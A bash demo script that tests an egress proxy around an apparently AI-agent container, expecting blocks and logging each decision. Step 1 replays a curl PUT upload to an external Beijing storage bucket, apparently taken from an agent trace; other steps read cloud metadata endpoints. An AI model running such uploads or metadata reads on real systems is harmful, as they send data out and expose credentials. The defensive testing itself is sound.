#!/usr/bin/env bash
# OL-659 live demo. Runs inside the agent container; output captured to demo-output.txt.
set -u
cd "$(dirname "$0")"
# Colima without Docker Desktop: ~/.docker/config.json may name a missing credential helper.
# Use a throwaway config (public base images only) and the Colima socket; user config untouched.
export DOCKER_CONFIG="$(mktemp -d)"; echo '{"cliPluginsExtraDirs":["/opt/homebrew/lib/docker/cli-plugins","/usr/local/lib/docker/cli-plugins"]}' > "$DOCKER_CONFIG/config.json"
export DOCKER_HOST="${DOCKER_HOST:-unix://$HOME/.colima/default/docker.sock}"
rm -rf out && mkdir -p out
docker compose up -d --build >/dev/null 2>&1 || { echo "compose up failed"; exit 1; }
sleep 3
A() { docker compose exec -T agent sh -c "$1" 2>&1; }
hr() { printf '\n== %s\n' "$1"; }

hr "0. agent network: no default route"
A 'ip route; echo "default route present? $(ip route | grep -c ^default)"'
hr "1. exact Cohere trace curl PUT (Beijing OSS) via the proxy -> expect 403"
A 'curl -s -m 10 -o /tmp/put_probe -X PUT --data-binary "PROBE_PAYLOAD_ABC123" http://sanmaohe.oss-cn-beijing.aliyuncs.com/upload/test.bin -w "HTTP:%{http_code}\n"; cat /tmp/put_probe'
hr "2. allowlisted host (example.com) via the proxy -> expect 200"
A 'curl -s -m 15 -o /dev/null -w "HTTP:%{http_code}\n" http://example.com/'
hr "2b. allowlisted host over HTTPS (CONNECT, host-level) -> expect 200"
A 'curl -s -m 15 -o /dev/null -w "HTTP:%{http_code}\n" https://example.com/'
hr "3. bypass the proxy (--noproxy) to the Beijing host -> expect network failure"
A 'curl -s -m 8 --noproxy "*" -X PUT --data-binary x http://sanmaohe.oss-cn-beijing.aliyuncs.com/upload/test.bin -w "HTTP:%{http_code}\n"; echo "curl exit=$?"'
hr "3b. bypass the proxy to a raw public IP (1.1.1.1) -> expect network failure"
A 'curl -s -m 8 --noproxy "*" http://1.1.1.1/ -o /dev/null -w "HTTP:%{http_code}\n"; echo "curl exit=$?"'
hr "3c. bypass the proxy to the allowlisted host -> expect network failure (allowlist is not a route)"
A 'curl -s -m 8 --noproxy "*" http://example.com/ -o /dev/null -w "HTTP:%{http_code}\n"; echo "curl exit=$?"'
hr "4. metadata IPs via the proxy -> expect 403"
A 'for u in http://169.254.169.254/latest/meta-data/ http://100.100.100.200/latest/meta-data/; do curl -s -m 8 -w " HTTP:%{http_code}\n" $u; done'
hr "4b. metadata over CONNECT -> expect 403"
A 'curl -sS -m 8 -o /dev/null https://169.254.169.254/ ; echo "curl exit=$?"'
hr "5. audit log (proxy side)"
sleep 1
python3 -I - <<'PY'
import json
for l in open("out/rai-actiongate.jsonl"):
    e = json.loads(l)
    print(e["decision"].upper().ljust(5), e["rule"].ljust(28), e["action_summary"], "(%sus)" % e.get("eval_us"))
PY
docker compose down -v >/dev/null 2>&1
